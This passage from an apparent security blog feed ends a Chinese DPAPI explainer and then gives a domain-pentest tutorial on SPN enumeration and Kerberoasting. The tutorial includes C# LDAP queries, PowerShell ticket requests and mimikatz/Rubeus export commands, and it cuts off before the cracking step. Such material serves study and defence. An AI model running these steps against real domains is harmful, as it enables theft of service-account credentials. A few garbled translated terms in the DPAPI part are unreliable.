），用来指示跟主密钥文件对应的历史凭据文件。对于域密钥本分单元，只有域环境下的用户才会有，此单元的数据经过了域管理员的公钥加密处理。对于单机用户，无论什么系统都没有域密钥备份单元，这篇文章主要解析单机用户主密钥单元。用户主密钥单元包含一个经过加密的二进制加密块，其中的加密数据就是主密钥。</p><p>​        用户主密钥单元中包含 PBKDF2 采用的迭代次数、安全散列算法类型和对称加密算法类型等字段，不同的操作系统有着不同的值</p><table><thead><tr><th style="text-align:center">操作系统</th><th style="text-align:center">PBKDF2迭代次数</th><th style="text-align:center">安全散列算法类型</th><th style="text-align:center">加密算法类型</th></tr></thead><tbody><tr><td style="text-align:center">Windows XP</td><td style="text-align:center">4000</td><td style="text-align:center">SHA-1</td><td style="text-align:center">DES-3</td></tr><tr><td style="text-align:center">Windows 2003</td><td style="text-align:center">4000</td><td style="text-align:center">SHA-1</td><td style="text-align:center">DES-3</td></tr><tr><td style="text-align:center">Windows Vista</td><td style="text-align:center">24000</td><td style="text-align:center">SHA-1</td><td style="text-align:center">DES-3</td></tr><tr><td style="text-align:center">Windows 7</td><td style="text-align:center">5600</td><td style="text-align:center">SHA-512</td><td style="text-align:center">SHA-256</td></tr><tr><td style="text-align:center">Windows 8</td><td style="text-align:center">8000</td><td style="text-align:center">SHA-512</td><td style="text-align:center">SHA-256</td></tr><tr><td style="text-align:center">Windows 10</td><td style="text-align:center"></td><td style="text-align:center"></td></tr></tbody></table><p>​        由 DPAPI 的加密过程分析可知，要使 DPAPI 正常运作，必须保存用户所有的历史登陆密码的 SHA-1 值。用户所有的历史登陆密码的 SHA-1 值存储在一个名为 CREDHIST 的历史凭据文件中，结构如图所示</p><p><img src="/image/【知识回顾】DPAPI 详解/历史凭据文件结构.png" alt=""></p><p><center>图5 历史凭据文件结构</center><br>​        CREDHIST 以链表的形式存储用户历史登陆密码的 SHA-1 值，每个用户的登陆密码散列值作为链表的一个节点，整个链表在文件中以反向形式存储，即表头在最后，倒数第二个记录时第一个节点，依次类推。而每个链表节点都具有相同的数据格式，并且每个节点的 SHA-1 值被前一个节点的 SHA-1 值加密处理，加密的方式与主密钥的加密方式一样。</p><p>​        图 2 的解密主密钥过程中涉及一个基于口令的密钥派生函数（ PBKDF2 ）的调用，微软的 PBKDF2 跟工业标准（ PKCD#5 ）不太一样，其内部做了部分改动。工业标准的 PBKDF2 函数循环内的伪随机函数的输入时上一次循环伪随机函数的输出，而微软 PBKDF2 函数伪随机函数的输入则是上两次相邻随机函数输出的异或。</p><h3 id="3-3-解密-DPAPI-加密块"><a href="#3-3-解密-DPAPI-加密块" class="headerlink" title="3.3 解密 DPAPI 加密块"></a>3.3 解密 DPAPI 加密块</h3><p>​        从图 2 的 DPAPI 离线解密过程可以知道，在解密 DPAPI加密块时先需要从主密钥派生一个会话密钥，派生过程中调用了改版的加密散列函数（ M_HMAC() ）和一个烟花密钥函数（ DeriveKey() ）。<code>M_HMAC()</code> 输入包括 DPAPI 提供的额外熵参数。</p><ul><li><p><code>M_HMAC()</code> 具体描述如下所示：</p>  <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">M_HMAC</span><span class="params">(K, m, e, s)</span></span> 算法的数据定义为：</span><br><span class="line"><span class="function"><span class="title">M_HMAC</span><span class="params">(K, m, e, s)</span></span> = H((K ⊕ opad) <span class="comment">// H((K ⊕ ipad) // m) // e // s)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">H</span><span class="params">()</span></span> 表示对应的散列函数</span><br><span class="line">K 表示密钥，这里对应密钥的 SHA-<span class="number">1</span> 值</span><br><span class="line">M 表示需要认证的数据，这里对应 Salt</span><br><span class="line">S 表示强密码</span><br><span class="line"><span class="comment">// 表示两个字符串的连接</span></span><br><span class="line">⊕ 表示异或</span><br><span class="line">Opad 表示外部填充块</span><br><span class="line">Ipad 表示内部填充块</span><br></pre></td></tr></table></figure></li><li><p><code>DeriveKey()</code> 对应于 CryptoAPI 的 CryptDeriveKey()，具体描述如下：</p>  <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">DeriveKey</span><span class="params">(d, n)</span></span> 算法的数据定义为：</span><br><span class="line"><span class="function"><span class="title">DeriveKey</span><span class="params">(d, n)</span></span> = F-n(H( d ⊕ ipad) <span class="comment">// H(d ⊕ opad))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">H</span><span class="params">()</span></span> 表示对应的散列函数</span><br><span class="line"><span class="function"><span class="title">F-n</span><span class="params">()</span></span> 表示取前 t 个字节数据</span><br><span class="line">n 表示需要演化出的密钥长度</span><br><span class="line">d 表示被演化的数据(对应 M_HMAC() 输出)，并通过填充 <span class="number">0</span> 补齐 <span class="number">64</span> 字节长</span><br><span class="line"><span class="comment">// 表示两个字符串的连接</span></span><br><span class="line">⊕ 表示异或</span><br><span class="line">Opad 表示外部填充块</span><br><span class="line">Ipad 表示内部填充块</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x04-DPAPI-的应用"><a href="#0x04-DPAPI-的应用" class="headerlink" title="0x04 DPAPI 的应用"></a>0x04 DPAPI 的应用</h2><ul><li>EFS文件加密</li><li>存储无线连接密码</li><li>Windows凭据管理器</li><li>IE浏览器</li><li>外表</li><li>Skype的</li><li>Windows CardSpace</li><li>Windows Vault</li><li>谷歌浏览器</li></ul><h2 id="0x05-结束语"><a href="#0x05-结束语" class="headerlink" title="0x05 结束语"></a>0x05 结束语</h2><p>在 WIndows 操作系统中，DPAPI 作为具有加密功能的最主要接口之一，保护着大量的用户私密数据。然而，本文给出的 DPAPI 离线解密方法，只适用于单机用户，无法解密域管理员控制下的 DPAPI 加密的数据。与环境控制下的 DPAPI 加密机制相对于淡季用户有很大的不同。</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="http://netinfo-security.org/CN/article/downloadArticleFile.do?attachType=PDF&amp;id=518" target="_blank" rel="noopener">DPAPI 离线解密方法及其取证应用</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;摘要：&lt;/strong&gt;数据保护接口是微软从 Windows 2000 开始引入的一种简易程序接口，主要为应用程序和操作系统程序提供高强度的数据加密和解密服务。Windows 系统用户大量的私密数据都采用了 DPAPI 进行加密存储。&lt;/p&gt;
    
    </summary>
    
      <category term="系统安全" scheme="https://rcoil.me/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="系统安全" scheme="https://rcoil.me/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
      <category term="知识回顾" scheme="https://rcoil.me/tags/%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE/"/>
    
  </entry>
  
  <entry>
    <title>【域渗透】SPN 扫描利用</title>
    <link href="https://rcoil.me/2019/06/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91SPN%20%E6%89%AB%E6%8F%8F%E5%88%A9%E7%94%A8/"/>
    <id>https://rcoil.me/2019/06/【域渗透】SPN 扫描利用/</id>
    <published>2019-06-10T10:52:59.000Z</published>
    <updated>2019-10-31T15:46:02.000Z</updated>
    
    <content type="html"><![CDATA[<p><code>Kerberos</code> 与 <code>SPN</code>。<br><a id="more"></a></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在内网渗透的信息收集中，机器服务探测一般都是通过端口扫描去做的，但是有些环境不允许这些操作。通过利用 SPN 扫描可快速定位开启了关键服务的机器，这样就不需要去扫对应服务的端口，有效规避端口扫描动作。</p><p><code>Kerberoasting</code> 是域渗透中经常使用的一项技术，是通过爆破 <code>TGS-REP</code> 实现。</p><h2 id="0x01-关于-SPN"><a href="#0x01-关于-SPN" class="headerlink" title="0x01 关于 SPN"></a>0x01 关于 <code>SPN</code></h2><p>服务主体名称（<code>SPN: Service Principal Names</code>）是服务实例，可以将其理解为一个服务（比如 HTTP、MSSQL）的唯一标识符，服务在加入域中时是自动注册的。</p><p>如果在整个林或域中的计算机上安装多个服务实例，则每个实例都必须具有自己的 <code>SPN</code>。如果客户端可能使用多个名称进行身份验证，则给定服务实例可以具有多个 <code>SPN</code>。<code>SPN</code> 始终包含运行服务实例的主机的名称，因此服务实例可以为其主机名称或别名注册 <code>SPN</code>。</p><p>如果用一句话来说明的话就是如果想使用 <code>Kerberos</code> 协议来认证服务，那么必须正确配置 <code>SPN</code>。</p><p>SPN 可以分为两种：</p><ul><li>注册在域内机器账户（<code>Computers</code>）上</li><li>注册在域内用户账户（<code>Users</code>）下</li></ul><h2 id="0x02-SPN-标准格式"><a href="#0x02-SPN-标准格式" class="headerlink" title="0x02 SPN 标准格式"></a>0x02 <code>SPN</code> 标准格式</h2><p>在 SPN 语法中存在 4 种元素，两个必须元素和两个格外元素。其中 <code>&lt;service class&gt;</code> 和 <code>&lt;host&gt;</code> 为必需元素。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;service <span class="class"><span class="keyword">class</span>&gt;/&lt;host&gt;:&lt;port&gt; &lt;servername&gt;</span></span><br><span class="line">服务类型/对应机器名<span class="symbol">:</span>服务端口[默认端口可不写]</span><br><span class="line">MSSQLSvc/SQLServer.rcoil.<span class="symbol">me:</span><span class="number">1433</span></span><br></pre></td></tr></table></figure><h2 id="0x03-使用-SetSPN-为机器-域用户-创建-SPN"><a href="#0x03-使用-SetSPN-为机器-域用户-创建-SPN" class="headerlink" title="0x03 使用 SetSPN 为机器(域用户)创建 SPN"></a>0x03 使用 <code>SetSPN</code> 为机器(域用户)创建 <code>SPN</code></h2><p>命令语法类似如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Setspn -S http/<span class="tag">&lt;<span class="name">computername</span>&gt;</span>.<span class="tag">&lt;<span class="name">domainname</span>&gt;</span> <span class="tag">&lt;<span class="name">domain-user-account</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>-S</code> 参数：验证不存在重复项后，添加随意 <code>SPN</code>。<strong>注意：</strong> <code>-S</code> 从 <code>Windows Server 2008</code> 开始系统默认提供。</p><p>此处以 Web 服务器为例。</p><ul><li>以 <code>web 用户</code> 运行 <code>Web 服务器</code></li><li>域管理员权限运行 <code>cmd</code></li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Setspn -s http/WebDemo_PC<span class="selector-class">.rcoil</span><span class="selector-class">.me</span> rcoil\web</span><br><span class="line">Setspn -s http/WebDemo_PC<span class="selector-class">.rcoil</span><span class="selector-class">.me</span> WebDemo_PC$</span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img src="/image/【域渗透】SPN 扫描利用/Snipaste_2019-06-06_15-41-04.png" alt="Snipaste_2019-06-06_15-41-04"></p><h2 id="0x04-借助-SetSPN-对域内相关服务进行查询"><a href="#0x04-借助-SetSPN-对域内相关服务进行查询" class="headerlink" title="0x04 借助 SetSPN 对域内相关服务进行查询"></a>0x04 借助 <code>SetSPN</code> 对域内相关服务进行查询</h2><h3 id="4-1、查询域内-MSSQL-数据库服务器"><a href="#4-1、查询域内-MSSQL-数据库服务器" class="headerlink" title="4.1、查询域内 MSSQL 数据库服务器"></a>4.1、查询域内 <code>MSSQL</code> 数据库服务器</h3><p><em>使用第 3 点中的对照表快速查询</em></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T rcoil.me -Q */* <span class="string">| findstr "</span>MSSQLSvc<span class="string">"</span></span><br></pre></td></tr></table></figure><h3 id="4-2、相关查询-C-源码"><a href="#4-2、相关查询-C-源码" class="headerlink" title="4.2、相关查询 C# 源码"></a>4.2、相关查询 <code>C# 源码</code></h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.DirectoryServices;</span><br><span class="line"><span class="keyword">using</span> System.DirectoryServices.ActiveDirectory;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Text.RegularExpressions;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">SPNSearcher</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="keyword">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            Domain CurrentDomain = Domain.GetCurrentDomain();</span><br><span class="line">            DirectoryEntry rootEntry = <span class="keyword">new</span> DirectoryEntry(<span class="string">"LDAP://rootDSE"</span>);</span><br><span class="line">            <span class="keyword">string</span> RootDSE = (<span class="keyword">string</span>)rootEntry.Properties[<span class="string">"defaultNamingContext"</span>].Value;</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Current Domain: "</span>+ CurrentDomain);</span><br><span class="line">            GetSPNInfor(RootDSE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> 通过 SPN 扫描获取域中基于主机的 MSSQL、Exchange 等服务</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> ADSearcherSPNTypes = "ADAM","AGPM","bo","CESREMOTE","Dfs","DNS","Exchange","FIMService","ftp","http","IMAP","ipp","iSCSITarget","kadmin","ldap","MS","sql","nfs","secshd","sip","SMTP","SoftGrid","TERMSRV","Virtual","vmrc","vnc","vpn","vssrvc","WSMAN","xmpp"</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="RootDSE"&gt;</span>Current forest.<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">GetSPNInfor</span>(<span class="params"><span class="keyword">string</span> RootDSE</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Current Domian SPN Information:"</span>);</span><br><span class="line"></span><br><span class="line">            DirectoryEntry gcEntry = <span class="keyword">new</span> DirectoryEntry(<span class="string">"GC://"</span> + RootDSE);</span><br><span class="line"></span><br><span class="line">            List&lt;<span class="keyword">string</span>&gt; Supersedence = <span class="keyword">new</span> List&lt;<span class="keyword">string</span>&gt;();</span><br><span class="line">            Supersedence.AddRange(<span class="keyword">new</span> <span class="keyword">string</span>[]</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">"SQL:*MSSQL*:SQL Server 数据库"</span>,</span><br><span class="line">                <span class="string">"Exchange:*exchange*:Exchange 相关服务"</span>,</span><br><span class="line">                <span class="string">"DNS:*DNS*:DNS 服务"</span>,</span><br><span class="line">                <span class="string">"SQL:*MySql*:MySql 数据库"</span>,</span><br><span class="line">                <span class="string">"Oracle:*Oracle*:Oracle 数据库"</span>,</span><br><span class="line">                <span class="string">"postgres:*postgres*:Postgres 数据库"</span>,</span><br><span class="line">                <span class="string">"HTTPS:*HTTPS*:HTTPS Web 服务"</span>,</span><br><span class="line">                <span class="string">"HTTP:*HTTP*:HTTP Web 服务"</span>,</span><br><span class="line">                <span class="string">"VPN:*VPN*:VPN 远程接入服务"</span>,</span><br><span class="line">                <span class="string">"VNC:*VNC*:VNC 服务"</span></span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">string</span> SPNServiceFilter <span class="keyword">in</span> Supersedence)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">string</span>[] sArray = Regex.Split(SPNServiceFilter, <span class="string">":"</span>, RegexOptions.IgnoreCase);</span><br><span class="line">                <span class="keyword">string</span> ContainsInfo = sArray[<span class="number">0</span>].ToString();</span><br><span class="line">                <span class="keyword">string</span> ADSearcherSPNTypes = sArray[<span class="number">1</span>].ToString();</span><br><span class="line">                <span class="keyword">string</span> SPNService = sArray[<span class="number">2</span>].ToString();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">using</span> (gcEntry)</span><br><span class="line">                &#123;</span><br><span class="line">                    DirectorySearcher spnSearch = <span class="keyword">new</span> DirectorySearcher(gcEntry, <span class="string">"(&amp;(objectClass=user)(servicePrincipalName="</span> + ADSearcherSPNTypes + <span class="string">"))"</span>);</span><br><span class="line"></span><br><span class="line">                    Console.WriteLine();</span><br><span class="line">                    Console.WriteLine(<span class="string">"  [+] SPN service: "</span> + SPNService);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">foreach</span> (SearchResult sr <span class="keyword">in</span> spnSearch.FindAll())</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">var</span> SPNs = sr.Properties[<span class="string">"servicePrincipalName"</span>];</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (SPNs.Count &gt; <span class="number">1</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">foreach</span> (<span class="keyword">string</span> spn <span class="keyword">in</span> SPNs)</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="keyword">if</span> (spn.Contains(ContainsInfo))</span><br><span class="line">                                &#123;</span><br><span class="line">                                    Console.WriteLine(<span class="string">"    [&gt;] SAM Account Name: &#123;0&#125;"</span>, sr.Properties[<span class="string">"sAMAccountName"</span>][<span class="number">0</span>]);</span><br><span class="line">                                    Console.WriteLine(<span class="string">"    [&gt;] "</span> + spn);</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            Console.WriteLine(<span class="string">"    [&gt;] "</span> + SPNs[<span class="number">0</span>]);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自行添加需要的服务即可，更多的服务写在了备注中。</p><h3 id="4-3、相关原理说明"><a href="#4-3、相关原理说明" class="headerlink" title="4.3、相关原理说明"></a>4.3、相关原理说明</h3><p>在 SPN 扫描时我们可以直接通过脚本，或者命令去获悉内网已经注册的 SPN 内容</p><p><code>LDAP 协议</code>全称是 <code>Lightweight Directory Access Protocol</code>，一般翻译都是翻译成 <strong>轻量目录访问协议</strong>。通俗点可以把 <code>LDAP 协议</code>理解为一个关系型数据库，其中存储了域内主机的各种配置信息。</p><p>在域控中默认安装有 <code>ADSI 编辑器</code>，它是 <code>LDAP</code> 的编辑器，可以通过在域控中运行 <code>adsiedit.msc</code> 来打开。</p><p><img src="/image/【域渗透】SPN 扫描利用/Snipaste_2019-06-10_10-43-30.png" alt="Snipaste_2019-06-10_10-43-30"></p><p>我们的 <code>SPN 查询</code>，实际上就是就是查询 <code>LDAP</code> 中存储的内容。（以后会通过别的章节详细介绍 <code>LDAP 协议</code>）</p><p>下图是 <code>4.2</code> 中 <code>MSSQL 查询</code>的结果，协议为 <code>LDAP</code>。</p><p><img src="/image/【域渗透】SPN 扫描利用/Snipaste_2019-06-10_10-19-38.png" alt="Snipaste_2019-06-10_10-19-38"></p><h3 id="4-4、更多扫描工具"><a href="#4-4、更多扫描工具" class="headerlink" title="4.4、更多扫描工具"></a>4.4、更多扫描工具</h3><p>扫描工具有很多，但是只要知道原理就不会觉得太难。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">Discover-PAMSSQLServers</span><span class="params">(Powershell-AD-Recon)</span></span></span><br><span class="line"><span class="function"><span class="title">GetUserSPNs</span><span class="params">(Powershell、vbs、Python)</span></span></span><br><span class="line"><span class="function"><span class="title">PowerView</span><span class="params">(Powershell)</span></span></span><br><span class="line"><span class="function"><span class="title">SetSPN</span><span class="params">(exe)</span></span></span><br></pre></td></tr></table></figure><h2 id="0x05-获取当前目标域中所有以域用户身份起服务的-SPN"><a href="#0x05-获取当前目标域中所有以域用户身份起服务的-SPN" class="headerlink" title="0x05 获取当前目标域中所有以域用户身份起服务的 SPN"></a>0x05 获取当前目标域中所有以域用户身份起服务的 SPN</h2><p>查询以域用户身份起的服务，主要是为了后续 <code>Kerberoast</code>做准备。</p><ul><li>现成工具</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cscript<span class="selector-class">.exe</span> GetUserSPNs.vbs</span><br><span class="line">powerview --&gt; Get-NetUser -SPN</span><br></pre></td></tr></table></figure><ul><li><code>C# 代码</code>（其实就是查询LDAP）：</li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">GetUserSPN</span>(<span class="params"><span class="keyword">string</span> RootDSE</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">"[*] Current Domian SPN Information:"</span>);</span><br><span class="line">            Console.WriteLine();</span><br><span class="line">            DirectoryEntry gcEntry = <span class="keyword">new</span> DirectoryEntry(<span class="string">"GC://"</span> + RootDSE);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">string</span> querySPN = <span class="string">@"(&amp;(!objectClass=computer)(servicePrincipalName=*))"</span>;</span><br><span class="line">            <span class="keyword">using</span> (gcEntry)</span><br><span class="line">            &#123;</span><br><span class="line">                DirectorySearcher mssqlSearch = <span class="keyword">new</span> DirectorySearcher(gcEntry, querySPN);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">foreach</span> (SearchResult sr <span class="keyword">in</span> mssqlSearch.FindAll())</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(<span class="string">"    [&gt;] SamAccountName: &#123;0&#125;"</span>, sr.Properties[<span class="string">"sAMAccountName"</span>][<span class="number">0</span>]);</span><br><span class="line">                    Console.WriteLine(<span class="string">"    [&gt;] DistinguishedName: &#123;0&#125;"</span>, sr.Properties[<span class="string">"distinguishedName"</span>][<span class="number">0</span>]);</span><br><span class="line">                    Console.WriteLine(<span class="string">"    [&gt;] ServicePrincipalName: &#123;0&#125;"</span>, sr.Properties[<span class="string">"servicePrincipalName"</span>][<span class="number">0</span>]);</span><br><span class="line">                    Console.WriteLine();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><ul><li><p>结果如下：</p><p><img src="/image/【域渗透】SPN 扫描利用/Snipaste_2019-06-10_11-22-02.png" alt="Snipaste_2019-06-10_11-22-02"></p></li></ul><h2 id="0x06-Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破"><a href="#0x06-Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破" class="headerlink" title="0x06 Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)"></a>0x06 Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)</h2><h3 id="6-1、申请-TGS"><a href="#6-1、申请-TGS" class="headerlink" title="6.1、申请 TGS"></a>6.1、申请 TGS</h3><ul><li><code>powershell</code></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS&gt;<span class="built_in">Add-Type</span> -AssemblyName System.IdentityModel</span><br><span class="line">PS&gt;<span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <span class="string">"HTTP/WebDemo_PC.rcoil.me"</span></span><br></pre></td></tr></table></figure><ul><li><code>C#</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public KerberosRequestorSecurityToken (string servicePrincipalName);</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">servicePrincipalName</span><br><span class="line">String</span><br><span class="line">KerberosRequestorSecurityToken 安全令牌的服务主体名称。 设置 ServicePrincipalName 属性。</span><br><span class="line">异常</span><br><span class="line">ArgumentNullException</span><br><span class="line">servicePrincipalName 为 null。</span><br><span class="line">SecurityTokenException</span><br><span class="line">无法为当前用户获取 Kerberos 票证。</span><br></pre></td></tr></table></figure><p>这一整个过程是通过 <code>AS-REQ、AS-REP、TGS-REQ、TGS-REP</code> 这四个认证流程，最终获取到 RC4方式的加密票据。</p><h3 id="6-2、获取-TGS-REP"><a href="#6-2、获取-TGS-REP" class="headerlink" title="6.2、获取 TGS-REP"></a>6.2、获取 TGS-REP</h3><p><code>Kerberos 协议</code>中请求的票据会保存在内存中，可以通过 <code>klist</code> 命令查看当前会话存储的 <code>kerberos</code> 票据。</p><p><img src="/image/【域渗透】SPN 扫描利用/Snipaste_2019-06-10_15-17-14.png" alt="Snipaste_2019-06-10_15-17-14"></p><ul><li><p>使用 <code>mimikatz</code> 的 <code>kerberos::list /export</code> 导出。</p></li><li><p><code>SharpRost</code> （如今的Rubeus）</p><p><img src="/image/【域渗透】SPN 扫描利用/Snipaste_2019-06-10_15-53-24.png" alt="Snipaste_2019-06-10_15-53-24"></p></li><li><p><code>Invoke-kerberoast</code> 的 <code>-outputformat</code> ，选择 hashcat 格式。</p></li><li><p>综合以上代码，新建项目，项目地址: <a href="https://github.com/RcoIl/CSharp-Tools/tree/master/SPNSearcher" target="_blank" rel="noopener">SPNSearcher</a></p></li></ul><h3 id="6-3、爆破-TGS-REP"><a href="#6-3、爆破-TGS-REP" class="headerlink" title="6.3、爆破 TGS-REP"></a>6.3、爆破 TGS-REP</h3><p>此处爆破的是<code>HTTP/WebDemo_PC.rcoil.me</code></p><p>可选择工具（工具始终是工具，看的是字典强不强）:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span 